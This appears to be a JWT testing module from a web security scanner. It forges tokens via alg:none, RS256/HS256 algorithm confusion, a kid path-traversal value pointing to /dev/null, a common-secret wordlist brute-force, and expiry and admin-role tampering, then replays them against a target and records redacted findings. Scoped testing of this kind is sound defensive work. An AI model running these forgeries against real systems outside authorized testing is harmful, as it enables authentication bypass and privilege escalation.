from __future__ import annotations

import base64
import hashlib
import hmac
import json
import time
from typing import Any
from urllib.parse import urlsplit, urlunsplit

import httpx

from scope_policy import scope_policy
from waf_engine import throttle


COMMON_JWT_SECRETS = [
    "password", "secret", "12345", "123456", "12345678", "jwt_secret",
    "jwt-secret", "jwtsecret", "app_secret", "app-secret", "appsecret",
    "secretkey", "secret_key", "mysecret", "changeme", "default",
    "admin", "root", "test", "testing", "development", "dev", "prod",
    "production", "staging", "local", "localhost", "qwerty", "letmein",
    "welcome", "welcome1", "password1", "password123", "passw0rd",
    "supersecret", "super_secret", "super-secret", "topsecret", "private",
    "privatekey", "private_key", "token", "access_token", "auth",
    "authorization", "bearer", "session", "session_secret", "cookie_secret",
    "signing_key", "signingkey", "signing-secret", "signing_secret",
    "jwt", "jwtkey", "jwt_key", "jwt-key", "jwtpassword", "jwt_password",
    "api", "apikey", "api_key", "api-secret", "api_secret", "client_secret",
    "clientsecret", "oauth_secret", "oauthsecret", "websecret", "web_secret",
    "server_secret", "serversecret", "backend_secret", "backendsecret",
    "frontend_secret", "microservice", "service_secret", "service-secret",
    "node", "nodejs", "express", "django", "flask", "spring", "laravel",
    "rails", "dotnet", "aspnet", "firebase", "supabase", "graphql",
    "mobile", "android", "ios", "company", "enterprise", "security",
    "key", "key123", "secret123", "secret1234", "abc123", "foobar",
    "sample", "demo", "example", "temporary", "temp", "master",
]


def _b64decode(value: str) -> bytes:
    return base64.urlsafe_b64decode((value + "=" * (-len(value) % 4)).encode("ascii"))


def _b64encode(value: bytes) -> str:
    return base64.urlsafe_b64encode(value).decode("ascii").rstrip("=")


def _decode_json(value: str) -> dict:
    parsed = json.loads(_b64decode(value).decode("utf-8"))
    return parsed if isinstance(parsed, dict) else {}


def _encode_json(value: dict) -> str:
    return _b64encode(json.dumps(value, separators=(",", ":"), ensure_ascii=True).encode("utf-8"))


def _sign_hmac(header: dict, payload: dict, secret: bytes, algorithm: str = "HS256") -> str:
    hash_fn = {
        "HS256": hashlib.sha256,
        "HS384": hashlib.sha384,
        "HS512": hashlib.sha512,
    }.get(algorithm.upper(), hashlib.sha256)
    encoded_header = _encode_json(header)
    encoded_payload = _encode_json(payload)
    signing_input = "{}.{}".format(encoded_header, encoded_payload).encode("ascii")
    signature = hmac.new(secret, signing_input, hash_fn).digest()
    return "{}.{}.{}".format(encoded_header, encoded_payload, _b64encode(signature))


def _alg_none(header: dict, payload: dict) -> str:
    forged_header = dict(header)
    forged_header["alg"] = "none"
    return "{}.{}.".format(_encode_json(forged_header), _encode_json(payload))


def _redact_token(token: str) -> str:
    value = str(token or "")
    if len(value) <= 20:
        return "[REDACTED_JWT]"
    return "{}...{}".format(value[:10], value[-8:])


def _token_fingerprint(token: str) -> str:
    return hashlib.sha256(token.encode("utf-8")).hexdigest()


async def _request(
    client: httpx.AsyncClient,
    url: str,
    headers: dict,
) -> httpx.Response | None:
    allowed, _reason = scope_policy.record_request(url, action="authenticated")
    if not allowed or throttle.host_dead:
        return None
    async with await throttle.gate():
        await throttle.record_request(url)
        try:
            response = await client.get(url, headers=headers, follow_redirects=False)
            if throttle.is_block_response(response.status_code, response.text[:500]):
                await throttle.record_block(
                    response.status_code,
                    response.text[:200],
                    url,
                    dict(response.headers),
                )
            return response
        except httpx.HTTPError:
            await throttle.record_network_error(url)
            return None


async def _accepted(client: httpx.AsyncClient, target_url: str, token: str) -> bool:
    response = await _request(
        client,
        target_url,
        {"Authorization": "Bearer {}".format(token)},
    )
    return bool(response and response.status_code == 200)


def _der_length(length: int) -> bytes:
    if length < 128:
        return bytes([length])
    encoded = length.to_bytes((length.bit_length() + 7) // 8, "big")
    return bytes([0x80 | len(encoded)]) + encoded


def _der_integer(value: int) -> bytes:
    encoded = value.to_bytes((value.bit_length() + 7) // 8 or 1, "big")
    if encoded[0] & 0x80:
        encoded = b"\x00" + encoded
    return b"\x02" + _der_length(len(encoded)) + encoded


def _rsa_public_pem(n_value: str, e_value: str) -> bytes:
    modulus = int.from_bytes(_b64decode(n_value), "big")
    exponent = int.from_bytes(_b64decode(e_value), "big")
    rsa_key = _der_integer(modulus) + _der_integer(exponent)
    rsa_sequence = b"\x30" + _der_length(len(rsa_key)) + rsa_key
    algorithm = bytes.fromhex("300d06092a864886f70d0101010500")
    bit_string = b"\x03" + _der_length(len(rsa_sequence) + 1) + b"\x00" + rsa_sequence
    public_key = algorithm + bit_string
    public_sequence = b"\x30" + _der_length(len(public_key)) + public_key
    encoded = base64.b64encode(public_sequence).decode("ascii")
    lines = [encoded[index:index + 64] for index in range(0, len(encoded), 64)]
    return (
        "-----BEGIN PUBLIC KEY-----\n{}\n-----END PUBLIC KEY-----\n"
        .format("\n".join(lines))
        .encode("ascii")
    )


async def _jwks_public_keys(
    client: httpx.AsyncClient,
    target_url: str,
    kid: str,
) -> list[bytes]:
    parsed = urlsplit(target_url)
    origin = urlunsplit((parsed.scheme, parsed.netloc, "", "", "")).rstrip("/")
    candidates = [
        origin + "/.well-known/jwks.json",
        origin + "/.well-known/openid-configuration",
        origin + "/jwks.json",
    ]
    jwks_urls: list[str] = []
    keys: list[bytes] = []
    for candidate in candidates:
        response = await _request(client, candidate, {})
        if not response or response.status_code != 200:
            continue
        try:
            data = response.json()
        except ValueError:
            continue
        if "jwks_uri" in data:
            jwks_urls.append(str(data["jwks_uri"]))
        if "keys" in data:
            jwks_urls.append(candidate)
            for key in data.get("keys", []):
                if key.get("kty") == "RSA" and key.get("n") and key.get("e"):
                    if not kid or not key.get("kid") or key.get("kid") == kid:
                        keys.append(_rsa_public_pem(key["n"], key["e"]))
    for jwks_url in jwks_urls:
        if jwks_url in candidates:
            continue
        response = await _request(client, jwks_url, {})
        if not response or response.status_code != 200:
            continue
        try:
            for key in response.json().get("keys", []):
                if key.get("kty") == "RSA" and key.get("n") and key.get("e"):
                    if not kid or not key.get("kid") or key.get("kid") == kid:
                        keys.append(_rsa_public_pem(key["n"], key["e"]))
        except ValueError:
            continue
    return keys[:3]


def _weak_secret(token: str, algorithm: str) -> bytes | None:
    if algorithm not in {"HS256", "HS384", "HS512"}:
        return None
    header_part, payload_part, signature_part = token.split(".", 2)
    signing_input = "{}.{}".format(header_part, payload_part).encode("ascii")
    signature = _b64decode(signature_part)
    hash_fn = {
        "HS256": hashlib.sha256,
        "HS384": hashlib.sha384,
        "HS512": hashlib.sha512,
    }[algorithm]
    for candidate in COMMON_JWT_SECRETS[:100]:
        expected = hmac.new(candidate.encode("utf-8"), signing_input, hash_fn).digest()
        if hmac.compare_digest(expected, signature):
            return candidate.encode("utf-8")
    return None


def _finding(
    title: str,
    target_url: str,
    test_name: str,
    forged_token: str,
    description: str,
    *,
    severity: str = "CRITICAL",
    extra: dict | None = None,
) -> dict:
    evidence = (
        "Accepted forged JWT via {}. token={} sha256={}"
        .format(test_name, _redact_token(forged_token), _token_fingerprint(forged_token))
    )
    finding = {
        "id": "JWT-{}-{}".format(int(time.time() * 1000), abs(hash(test_name + target_url)) % 99999),
        "source": "jwt-attack-suite",
        "vuln_type": title,
        "vulnerability_class": "JWT Authentication Bypass",
        "severity": severity,
        "confidence": 99,
        "url": target_url,
        "affected_url": target_url,
        "method": "GET",
        "description": description,
        "evidence": evidence,
        "remediation": "Pin the expected JWT algorithm, validate signatures and expiry server-side, reject unsafe kid values, and rotate weak signing keys.",
        "cwe": "CWE-347",
        "cvss": 9.1 if severity == "CRITICAL" else 8.1,
        "jwt_test": test_name,
        "forged_token_redacted": _redact_token(forged_token),
        "forged_token_sha256": _token_fingerprint(forged_token),
        "exploitability_status": "confirmed",
        "evidence_strength": "strong",
        "false_positive_risk": "low",
        "business_impact": "A forged JWT was accepted by a protected endpoint, enabling authentication or privilege bypass.",
        "technical_impact": description,
        "reproduction_steps": [
            "Authenticate to the authorized test account and capture the original JWT.",
            "Generate the {} forged token in an isolated test environment.".format(test_name),
            "Replay it as Authorization: Bearer <FORGED_TOKEN> to {}.".format(target_url),
            "Observe HTTP 200 from the protected endpoint.",
        ],
        "safe_manual_validation_steps": [
            "Use only an approved disposable test account.",
            "Do not persist or share the full JWT; use the recorded SHA-256 fingerprint.",
        ],
        "redaction_status": "redacted",
        "verdict": "PASS",
    }
    if extra:
        finding.update(extra)
    return finding


async def test_jwt(
    token: str,
    target_url: str,
    client: httpx.AsyncClient,
) -> list[dict]:
    if not scope_policy.config.authenticated_testing_enabled:
        return []
    try:
        header_part, payload_part, _signature_part = token.split(".", 2)
        header = _decode_json(header_part)
        payload = _decode_json(payload_part)
    except (ValueError, json.JSONDecodeError, UnicodeDecodeError):
        return []

    # Prevent public endpoints from creating false confirmations.
    unauthenticated = await _request(client, target_url, {})
    original_accepted = await _accepted(client, target_url, token)
    if (
        not original_accepted
        or not unauthenticated
        or unauthenticated.status_code not in (401, 403)
    ):
        return []

    findings: list[dict] = []
    algorithm = str(header.get("alg", "")).upper()
    signing_secret: bytes | None = None
    signing_algorithm = ""
    signing_header: dict = {}

    # 1. alg:none
    forged_none = _alg_none(header, payload)
    if await _accepted(client, target_url, forged_none):
        findings.append(_finding(
            "JWT alg:none Authentication Bypass",
            target_url,
            "alg_none",
            forged_none,
            "The server accepted an unsigned JWT with alg=none.",
        ))

    # 2. RS256 -> HS256 algorithm confusion using same-origin JWKS public key.
    if algorithm == "RS256":
        for public_key in await _jwks_public_keys(client, target_url, str(header.get("kid", ""))):
            confused_header = dict(header)
            confused_header["alg"] = "HS256"
            forged_confusion = _sign_hmac(confused_header, payload, public_key, "HS256")
            if await _accepted(client, target_url, forged_confusion):
                signing_secret = public_key
                signing_algorithm = "HS256"
                signing_header = confused_header
                findings.append(_finding(
                    "JWT RS256/HS256 Algorithm Confusion",
                    target_url,
                    "algorithm_confusion",
                    forged_confusion,
                    "The server accepted an HS256 token signed with its RSA public key.",
                ))
                break

    # 3. kid path traversal with an empty /dev/null HMAC key.
    if header.get("kid") is not None:
        kid_header = dict(header)
        kid_header["kid"] = "../../dev/null"
        kid_header["alg"] = "HS256"
        forged_kid = _sign_hmac(kid_header, payload, b"", "HS256")
        if await _accepted(client, target_url, forged_kid):
            findings.append(_finding(
                "JWT kid Path Traversal Authentication Bypass",
                target_url,
                "kid_path_traversal",
                forged_kid,
                "The server accepted kid=../../dev/null with an empty HMAC signing key.",
            ))

    # 4. Offline weak-secret recovery, followed by one replay.
    recovered = _weak_secret(token, algorithm)
    if recovered is not None:
        signing_secret = recovered
        signing_algorithm = algorithm
        signing_header = dict(header)
        weak_header = dict(header)
        forged_weak = _sign_hmac(weak_header, payload, recovered, algorithm)
        if await _accepted(client, target_url, forged_weak):
            findings.append(_finding(
                "JWT Weak Signing Secret",
                target_url,
                "weak_secret",
                forged_weak,
                "The JWT signature matched one of 100 common secrets and the token was accepted.",
                extra={"secret_redacted": "[REDACTED_WEAK_SECRET]"},
            ))

    # 5. Expiry manipulation.
    expiry_payload = dict(payload)
    expiry_payload["exp"] = 4070908800  # 2099-01-01 UTC
    expiry_token = (
        _sign_hmac(signing_header, expiry_payload, signing_secret, signing_algorithm)
        if signing_secret is not None and signing_algorithm.startswith("HS")
        else _alg_none(header, expiry_payload)
    )
    if await _accepted(client, target_url, expiry_token):
        findings.append(_finding(
            "JWT Expiry Manipulation Accepted",
            target_url,
            "expiry_manipulation",
            expiry_token,
            "The server accepted a forged JWT with exp changed to the year 2099.",
        ))

    # 6. Role escalation.
    role_payload = dict(payload)
    role_changed = False
    for key in list(role_payload):
        lower = str(key).lower()
        if lower == "role":
            role_payload[key] = "admin"
            role_changed = True
        elif lower in {"admin", "isadmin", "is_admin"}:
            role_payload[key] = True
            role_changed = True
    if role_changed:
        role_token = (
            _sign_hmac(signing_header, role_payload, signing_secret, signing_algorithm)
            if signing_secret is not None and signing_algorithm.startswith("HS")
            else _alg_none(header, role_payload)
        )
        if await _accepted(client, target_url, role_token):
            findings.append(_finding(
                "JWT Role Escalation Accepted",
                target_url,
                "role_escalation",
                role_token,
                "The server accepted a forged JWT with administrative role claims.",
            ))

    return findings
